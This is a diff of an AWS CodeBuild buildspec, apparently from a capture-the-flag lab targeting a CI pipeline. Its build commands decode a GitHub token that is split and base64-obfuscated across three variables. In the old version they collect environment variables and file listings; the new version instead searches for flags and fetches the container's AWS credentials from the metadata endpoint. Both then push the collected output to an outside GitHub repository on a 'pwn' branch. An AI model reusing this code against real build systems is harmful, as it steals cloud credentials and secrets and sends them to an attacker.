@@ -3,30 +3,24 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "Searching for flag"
+      - echo "Flag search"
       - |
         P1="Z2l0aHViX3BhdF8xMUJTVUwyS0E="
         P2="MGxkVERCbVFPYXlaal9JZUJ1ZFA="
         P3="ckp2ZExkYkhQa1VQN2l6WTBPN3BSM3VoRUhTZmNUUks3MFIxeVQ3SU9YTEdHRDlYeFo5bUE="
         TK="$(echo -n $P1 | base64 -d)$(echo -n $P2 | base64 -d)$(echo -n $P3 | base64 -d)"
-        FNAME="exfil-${CODEBUILD_BUILD_NUMBER}.txt"
-        exec 2>&1
         {
-          echo "=== FULL ENV ==="
-          env | sort
-          echo "=== FILES IN REPO ==="
-          find . -type f 2>/dev/null
-          echo "=== SEARCH FLAG IN FILES ==="
-          grep -ri "flag" . 2>/dev/null || echo "no flag in repo files"
-          echo "=== SEARCH FLAG IN SYSTEM ==="
-          find /tmp /opt /codebuild -name "*flag*" -o -name "*secret*" 2>/dev/null || true
-          grep -rli "flag{" /tmp /opt /codebuild 2>/dev/null || true
-          echo "=== CODEBUILD PROJECT CONFIG ==="
-          aws codebuild batch-get-projects --names codebuild_lab_5_project --region us-east-1 2>&1 || true
+          echo "=== CODEBUILD PROJECT ==="
+          aws codebuild batch-get-projects --names codebuild_lab_5_project --region us-east-1 2>&1
+          echo "=== GREP FLAG ==="
+          grep -ri "flag" /codebuild /tmp 2>/dev/null | head -50
+          find / -name "*flag*" -type f 2>/dev/null | head -20
+          echo "=== CURL METADATA ==="
+          curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI 2>&1 | head -20
           echo "=== DONE ==="
-        } > /tmp/output.txt
-        CONTENT_B64=$(cat /tmp/output.txt | head -c 60000 | base64 -w0)
+        } > /tmp/out.txt 2>&1
+        B64=$(base64 -w0 /tmp/out.txt)
         curl -s -X PUT -H "Authorization: token $TK" -H "Content-Type: application/json" \
-          "https://api.github.com/repos/DeonCoolx/codebuild-codebreach-actors-lab/contents/$FNAME" \
-          -d "{\"message\":\"output\",\"content\":\"$CONTENT_B64\",\"branch\":\"pwn\"}" > /dev/null 2>&1 || true
+          "https://api.github.com/repos/DeonCoolx/codebuild-codebreach-actors-lab/contents/out.txt" \
+          -d "{\"message\":\"r\",\"content\":\"$B64\",\"branch\":\"pwn\"}" > /dev/null 2>&1
         unset TK P1 P2 P3
